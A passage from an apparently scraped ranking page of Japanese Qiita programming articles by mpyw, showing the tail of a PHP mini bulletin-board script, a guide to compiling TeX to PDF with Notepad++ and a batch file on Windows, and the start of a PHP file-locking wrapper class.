            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">];</span>
            <span class="c1">// フォームの投稿内容をリセットする</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
            <span class="c1">// 正しい処理を行ったが、形式上例外としてスロー</span>
            <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'書き込みました'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// 総件数をセット</span>
    <span class="nv">$whole_count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$articles</span><span class="p">);</span>
    <span class="c1">// 総ページ数をセット</span>
    <span class="nv">$page_count</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$whole_count</span> <span class="o">/</span> <span class="nx">DISP_MAX</span><span class="p">);</span>
    <span class="c1">// ページ番号にあった分だけ取り出す</span>
    <span class="nv">$articles</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$articles</span><span class="p">,</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="nx">DISP_MAX</span><span class="p">);</span>
    <span class="c1">// 現在のページの件数をセット</span>
    <span class="nv">$current_count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$articles</span><span class="p">);</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
<span class="c1">// 後始末</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
    <span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">LOCK_UN</span><span class="p">);</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* ワンタイムトークンを次の投稿のために準備 */</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span>
    <span class="k">array</span><span class="p">(</span><span class="nv">$token</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">mt_rand</span><span class="p">())</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">],</span>
    <span class="mi">0</span><span class="p">,</span>
    <span class="nx">TOKEN_MAX</span>
<span class="p">);</span>

<span class="cm">/* ヘッダー送信 */</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&lt;!DOCTYPE html&gt;</span>
<span class="x">&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;</span>
<span class="x">  &lt;head&gt;</span>
<span class="x">    &lt;title&gt;ミニ掲示板&lt;/title&gt;</span>
<span class="x">    &lt;style type="text/css"&gt;&lt;![CDATA[</span>
<span class="x">    &lt;!--</span>
<span class="x">    #wrapper {</span>
<span class="x">      width: 100%;</span>
<span class="x">    }</span>
<span class="x">    #header, #container, #footer {</span>
<span class="x">      width: 650px;</span>
<span class="x">      margin: 0px auto;</span>
<span class="x">    }</span>
<span class="x">    #header, #footer {</span>
<span class="x">      text-align: center;</span>
<span class="x">    }</span>
<span class="x">    #messages, #textarea, #articles {</span>
<span class="x">      width: 550px;</span>
<span class="x">      margin: -3px auto 0px;</span>
<span class="x">      border-top: 3px double brown;</span>
<span class="x">      padding: 28px;</span>
<span class="x">    }</span>
<span class="x">    #articles { </span>
<span class="x">      overflow: hidden;</span>
<span class="x">      padding-top: 0px;</span>
<span class="x">    }</span>
<span class="x">    .article {</span>
<span class="x">      margin-top: -1px;</span>
<span class="x">      border-top: 1px dotted brown;</span>
<span class="x">      padding: 19px;</span>
<span class="x">    }</span>
<span class="x">    .article_name {</span>
<span class="x">      font-size: 27px;</span>
<span class="x">    }</span>
<span class="x">    .article_text {</span>
<span class="x">      margin: 20px;</span>
<span class="x">    }</span>
<span class="x">    .article_time {</span>
<span class="x">      text-align: right;</span>
<span class="x">      font-size: 11px;</span>
<span class="x">    }</span>
<span class="x">    .page {</span>
<span class="x">      font-size: 11px;</span>
<span class="x">      text-align: right;</span>
<span class="x">    }</span>
<span class="x">    body {</span>
<span class="x">      background: antiquewhite;</span>
<span class="x">    }</span>
<span class="x">    h1 {</span>
<span class="x">      color: fuchsia;</span>
<span class="x">    }</span>
<span class="x">    textarea {</span>
<span class="x">      width: 100%;</span>
<span class="x">      height: 150px;</span>
<span class="x">    }</span>
<span class="x">    label {</span>
<span class="x">      display: block;</span>
<span class="x">      margin: 10px 10px;</span>
<span class="x">    }</span>
<span class="x">    --&gt;</span>
<span class="x"> ]]&gt;&lt;/style&gt;</span>
<span class="x">  &lt;/head&gt;</span>
<span class="x">  &lt;body&gt;</span>
<span class="x">    &lt;div id="wrapper"&gt;</span>
<span class="x">      &lt;div id="header"&gt;</span>
<span class="x">        &lt;h1&gt;～ミニ掲示板～&lt;/h1&gt;</span>
<span class="x">      &lt;/div&gt;</span>
<span class="x">      &lt;div id="container"&gt;</span>
<span class="x">        &lt;div id="textarea"&gt;</span>
<span class="x">          &lt;form action="" method="post"&gt;</span>
<span class="x">            &lt;label&gt;名前: &lt;input name="name" type="text" value="</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">" /&gt;&lt;/label&gt;</span>
<span class="x">            &lt;label&gt;Eメール: &lt;input name="email" type="text" value="</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">" /&gt;&lt;/label&gt;</span>
<span class="x">            &lt;label&gt;本文&lt;p&gt;&lt;textarea name="text"&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&lt;/textarea&gt;&lt;/p&gt;&lt;/label&gt;</span>
<span class="x">            &lt;label style="text-align:right;"&gt;&lt;input type="submit" name="submit" value="投稿" /&gt;&lt;/label&gt;</span>
<span class="x">            &lt;label&gt;&lt;input type="hidden" name="token" value="</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$token</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">" /&gt;&lt;/label&gt;</span>
<span class="x">          &lt;/form&gt;</span>
<span class="x">        &lt;/div&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &lt;div id="messages"&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nx">exception_to_array</span><span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$msg</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">          &lt;div&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">&lt;/div&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &lt;/div&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$articles</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &lt;div id="articles"&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$articles</span> <span class="k">as</span> <span class="nv">$article</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">          &lt;div class="article"&gt;</span>
<span class="x">            &lt;div class="article_name"&gt;&lt;a href="mailto:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">"&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&lt;/a&gt;&lt;/div&gt;</span>
<span class="x">            &lt;div class="article_text"&gt;&lt;pre&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&lt;/pre&gt;&lt;/div&gt;</span>
<span class="x">            &lt;div class="article_time"&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'time'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&lt;/div&gt;</span>
<span class="x">          &lt;/div&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &lt;/div&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">      &lt;/div&gt;</span>
<span class="x">      &lt;div id="footer"&gt;</span>
<span class="x">        &lt;div&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">          &lt;a href="?page=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$page</span><span class="o">-</span><span class="mi">1</span><span class="cp">?&gt;</span><span class="x">"&gt;前&lt;/a&gt; | </span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">          &lt;a href="?"&gt;最新&lt;/a&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$page_count</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$page</span> <span class="o">&lt;</span> <span class="nv">$page_count</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">           | &lt;a href="?page=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$page</span><span class="o">+</span><span class="mi">1</span><span class="cp">?&gt;</span><span class="x">"&gt;次&lt;/a&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &lt;/div&gt;</span>
<span class="x">        &lt;p class="page"&gt;</span><span class="cp">&lt;?php</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$current_count</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'まだ書き込みはありません'</span><span class="p">;</span>
          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nb">printf</span><span class="p">(</span><span class="s1">'%d件中%d件目～%d件目(%dページ中%dページ目)を表示中'</span><span class="p">,</span>
              <span class="nv">$whole_count</span><span class="p">,</span>
              <span class="p">(</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="nx">DISP_MAX</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
              <span class="nv">$tmp</span> <span class="o">+</span> <span class="nv">$current_count</span><span class="p">,</span>
              <span class="nv">$page_count</span><span class="p">,</span>
              <span class="nv">$page</span>
            <span class="p">);</span>
          <span class="p">}</span>
        <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
<span class="x">      &lt;/div&gt;</span>
<span class="x">    &lt;/div&gt;</span>
<span class="x">  &lt;/body&gt;</span>
<span class="x">&lt;/html&gt;</span><span class="cp">&lt;?php</span> 
<span class="cm">/* ここから先データ部 */</span>
<span class="nb">__halt_compiler</span><span class="p">();</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />61位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>11</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/28979ee8dbfdde4ddff6">Windowsで快適にTeX</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-01-23 04:33:10</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[LaTeX]</b> <b>[Windows]</b> <b>[TeX]</b> <b>[Notepad++]</b> <b>[W32TeX]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a>前書き</h1>

<p><strong>「Windows大好き！Linux何それおいしいの？」</strong> 的な人の願望を叶えるための記事です。大学のレポートもWindows上でサクサク書いてしまいましょう！</p>

<h1>
<span id="tex" class="fragment"></span><a href="#tex"><i class="fa fa-link"></i></a>TeX</h1>

<p><strong><a href="http://oku.edu.mie-u.ac.jp/%7Eokumura/texwiki/?TeX%20installers%20for%20Windows" rel="nofollow noopener" target="_blank">TeX Wiki - TeX installers for Windows</a></strong> からお好きな物を選択してインストールしてください。私は2番目の <strong>「TeX インストーラ 3」</strong> を使って <strong>「W32 TeX」</strong> をインストールしました。ダウンロード・インストールにはそれなりに時間がかかると思います。</p>

<p>ぁ、ぅんWindowsだヵら$\rm\LaTeX$でゎなぃ（笑<br>
って思ったけどパッケージの中に結局$\rm\LaTeX$同梱されてるっぽいね</p>

<h1>
<span id="notepad" class="fragment"></span><a href="#notepad"><i class="fa fa-link"></i></a>Notepad++</h1>

<p>Windows最強のエディタと言えばやっぱり <strong>Notepad++</strong> でしょ！</p>

<p><strong><a href="http://notepad-plus-plus.org/" rel="nofollow noopener" target="_blank">Notepad++</a></strong></p>

<p><strong><a href="http://sourceforge.jp/projects/notepad-plus/" rel="nofollow noopener" target="_blank">Notepad プロジェクト日本語トップページ - SourceForge.JP</a></strong></p>

<h2>
<span id="基本設定" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>基本設定</h2>

<p>（日本語プラグインで英語のままになっているところがあると思いますが、適当に対応してください）</p>

<ol>
<li>「設定」→「環境設定」→「新規作成」を開く。</li>
<li>フォーマットで <strong>「Unix」</strong> を選択、エンコードで <strong>「UTF-8(BOM無し)」</strong> を選択して <strong>「開いているANSIファイルに適用」</strong> にチェックを入れる。TeX編集にしかこのエディタを使わないのであればデフォルトの言語に <strong>「TeX」</strong> を指定しておく。</li>
<li>「設定」→「環境設定」→「ファイルの関連付け」を開く。</li>
<li> <strong>「.tex」</strong> を登録。</li>
<li>「設定」→「環境設定」→「タブ設定」を開く。</li>
<li>タブサイズで <strong>2～4</strong> 程度の任意の値を指定する。タブ文字よりも半角スペース複数個の方が好みであれば「半角スペースで置換」にチェックを入れる。</li>
<li>「設定」→「環境設定」→「入力補完」を開く。</li>
<li>「入力毎の入力補完を有効にする」にチェックを入れる。 <strong>「関数補完」</strong> と <strong>「単語補完」</strong> の2種類がある。最低限の補完が欲しければ前者、鬱陶しいぐらいに候補を出してほしいなら後者を選択。補完を有効にする最小文字数は <strong>3</strong> あたりが無難。</li>
</ol>

<p>常に編集は<br>
<a href="https://camo.qiitausercontent.com/1016eca3a822e1555d000f66de55fe9eb9d805bb/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f31643337333334352d363363662d363631382d656666642d3264393661373762613361332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/1016eca3a822e1555d000f66de55fe9eb9d805bb/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f31643337333334352d363363662d363631382d656666642d3264393661373762613361332e706e67" alt="d8083222-d988-6dd6-e8c0-8a533cca745d.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/1d373345-63cf-6618-effd-2d96a77ba3a3.png"></a><br>
この状態で行う。</p>

<h2>
<span id="便利な機能" class="fragment"></span><a href="#%E4%BE%BF%E5%88%A9%E3%81%AA%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>便利な機能</h2>

<ul>
<li>
<strong>入力候補を強制的に表示</strong><br>→ <code>Ctrl</code> <code>Space</code> を押す。</li>
<li>
<strong>まとめてインデント</strong><br>→ 複数行選択して <code>Tab</code> を押す。</li>
<li>
<strong>まとめてアンインデント</strong><br>→ 複数行選択して <code>Shift</code> <code>Tab</code> を押す。</li>
</ul>

<p>そのほか…<br>
<strong>全角入力中に <code>￥￥</code> と2回連続して入力すると <code>\\\\</code> に変換してくれる。</strong></p>

<h2>
<span id="tex-ファイルから-pdf-ファイルを生成する" class="fragment"></span><a href="#tex-%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%8B%E3%82%89-pdf-%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E7%94%9F%E6%88%90%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>TeX</strong> ファイルから <strong>PDF</strong> ファイルを生成する</h2>

<h3>
<span id="下準備" class="fragment"></span><a href="#%E4%B8%8B%E6%BA%96%E5%82%99"><i class="fa fa-link"></i></a>下準備</h3>

<div class="code-frame" data-lang="bat">
<div class="code-lang"><span class="bold">(A)</span></div>
<div class="highlight"><pre><span></span><span class="p">@</span><span class="k">echo</span> off

<span class="k">cd</span> /d <span class="nv">%1</span>
<span class="k">if</span> <span class="nv">%errorlevel%</span> <span class="ow">neq</span> 0 <span class="p">(</span>
  <span class="k">pause</span>
  <span class="k">exit</span> /b 1
<span class="p">)</span>

<span class="k">del</span> <span class="nv">%4</span> <span class="p">&gt;</span>NUL <span class="mi">2</span><span class="p">&gt;&amp;</span><span class="mi">1</span>
platex -guess-input-enc -jobname=<span class="nv">%3</span> -interaction=nonstopmode <span class="nv">%2</span>
<span class="k">if</span> <span class="nv">%errorlevel%</span> <span class="ow">neq</span> 0 <span class="k">goto</span> <span class="nl">error</span>

dvipdfmx <span class="nv">%7</span>
<span class="k">if</span> <span class="nv">%errorlevel%</span> <span class="ow">neq</span> 0 <span class="k">goto</span> <span class="nl">error</span>

<span class="k">del</span> <span class="nv">%4</span> <span class="nv">%5</span> <span class="nv">%6</span> <span class="nv">%7</span> <span class="p">&gt;</span>NUL <span class="mi">2</span><span class="p">&gt;&amp;</span><span class="mi">1</span>
<span class="nv">%8</span>
<span class="k">goto</span> <span class="p">:</span><span class="nl">eof</span>

<span class="p">:</span><span class="nl">error</span>
<span class="k">del</span> <span class="nv">%4</span> <span class="nv">%5</span> <span class="nv">%6</span> <span class="nv">%7</span> <span class="p">&gt;</span>NUL <span class="mi">2</span><span class="p">&gt;&amp;</span><span class="mi">1</span>
<span class="k">pause</span>
<span class="k">exit</span> /b 1
</pre></div>
</div>

<div class="code-frame" data-lang="bash">
<div class="code-lang"><span class="bold">(B)</span></div>
<div class="highlight"><pre><span></span><span class="s2">"</span><span class="k">$(</span>NPP_DIRECTORY<span class="k">)</span><span class="s2">/pdfplatex.bat"</span> <span class="s2">"</span><span class="k">$(</span>CURRENT_DIRECTORY<span class="k">)</span><span class="s2">"</span> <span class="s2">"</span><span class="k">$(</span>FILE_NAME<span class="k">)</span><span class="s2">"</span> <span class="s2">"</span><span class="k">$(</span>NAME_PART<span class="k">)</span><span class="s2">"</span> <span class="s2">"</span><span class="k">$(</span>NAME_PART<span class="k">)</span><span class="s2">.aux"</span> <span class="s2">"</span><span class="k">$(</span>NAME_PART<span class="k">)</span><span class="s2">.log"</span> <span class="s2">"</span><span class="k">$(</span>NAME_PART<span class="k">)</span><span class="s2">.out"</span> <span class="s2">"</span><span class="k">$(</span>NAME_PART<span class="k">)</span><span class="s2">.dvi"</span> <span class="s2">"</span><span class="k">$(</span>NAME_PART<span class="k">)</span><span class="s2">.pdf"</span>
</pre></div>
</div>

<ol>
<li>
<strong>notepad++.exe</strong> が存在するフォルダに、 <strong>(A)</strong> を記述したバッチファイルを作成する。ファイル名は <strong>pdfplatex.bat</strong> とする。</li>
<li>「実行」→「ファイル名を指定して実行」を開く。</li>
<li>「実行するファイル」に <strong>(B)</strong> を入力して「登録」を押す。ショートカットキーはお好みで。</li>
</ol>

<h3>
<span id="実行" class="fragment"></span><a href="#%E5%AE%9F%E8%A1%8C"><i class="fa fa-link"></i></a>実行</h3>

<ol>
<li>開いているTeXファイルを上書き保存。</li>
<li>登録したショートカットキーを押す。</li>
<li>コマンドプロンプトが起動し、生成されたPDFファイルが開ければ成功。</li>
</ol>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />62位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>11</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/80d630d9f89dcf8d7c42">readfile()・file_get_contents()・file_put_contents()を例外処理・ロック処理できるようにしたクラス</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-21 09:46:47</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="sd">/**</span>
<span class="sd"> * File</span>
<span class="sd"> *</span>
<span class="sd"> * A wrapper class for lockable readfile(), file_get_contents(), file_put_contents().</span>
<span class="sd"> * Requires PHP 5.0.0 or later.</span>
<span class="sd"> * </span>
<span class="sd"> * @Version 2.1.0</span>
<span class="sd"> * @Author  CertaiN</span>
<span class="sd"> * @License BSD 2-Clause</span>
<span class="sd"> * @GitHub  http://github.com/Certainist/File</span>
<span class="sd"> */</span>
<span class="k">class</span> <span class="nc">File</span> <span class="p">{</span>

   <span class="sd">/**</span>
<span class="sd">    * @constant integer For setBlockMode().</span>
<span class="sd">    */</span>
    <span class="k">const</span> <span class="no">BLOCKMODE_YES</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">BLOCKMODE_NO</span>  <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>

   <span class="sd">/**</span>
<span class="sd">    * @access private</span>
<span class="sd">    * @static</span>
<span class="sd">    */</span>
    <span class="k">private</span> <span class="k">static</span> <span class="nv">$blockmode</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">BLOCKMODE_YES</span><span class="p">;</span>

   <span class="sd">/**</span>
<span class="sd">    * @access   private</span>
<span class="sd">    */</span>
    <span class="k">private</span> <span class="nv">$fp</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$locked</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$headers_preset</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$headers_list</span><span class="p">;</span>

   <span class="sd">/**</span>
<span class="sd">    * Set blocking mode on locking.</span>
<span class="sd">    * This only means FILE-LOCK-BLOCKING-MODE, not means STREAM-BLOCKING-MODE.</span>
<span class="sd">    * BLOCKMODE_NO is not supported on windows.</span>
<span class="sd">    * </span>
<span class="sd">    * @access public</span>
<span class="sd">    * @static</span>
<span class="sd">    * @param  integer $mode File::BLOCKMODE_XXX</span>
<span class="sd">    */</span>    
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">setBlockMode</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_int</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$mode</span> <span class="o">!==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nv">$mode</span> <span class="o">!==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'Invalid block mode'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">self</span><span class="o">::</span><span class="nv">$blockmode</span> <span class="o">=</span> <span class="nv">$mode</span><span class="p">;</span>
    <span class="p">}</span>

   <span class="sd">/**</span>
<span class="sd">    * Use instead of file_get_contents().</span>
<span class="sd">    * Automatically locked by LOCK_SH mode.</span>
<span class="sd">    * </span>
<span class="sd">    * @access public</span>
<span class="sd">    * @static</span>
<span class="sd">    * @param  string $filename</span>
<span class="sd">    * @return string</span>
<span class="sd">    */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">factory</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">locked</span> <span class="o">=</span> <span class="nb">flock</span><span class="p">(</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="nx">LOCK_SH</span> <span class="o">|</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$blockmode</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Failed to lock file '</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Unknown stream error on '</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

   <span class="sd">/**</span>
<span class="sd">    * Use instead of file_put_contents().</span>
<span class="sd">    * Automatically locked by LOCK_EX mode.</span>
<span class="sd">    * </span>
<span class="sd">    * @access public</span>
<span class="sd">    * @static</span>
<span class="sd">    * @param  string $filename</span>
<span class="sd">    * @param  string $data</span>
<span class="sd">    * @return integer          The number of written bytes.</span>
<span class="sd">    */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">write</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">factory</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">'ab'</span><span class="p">);</span>
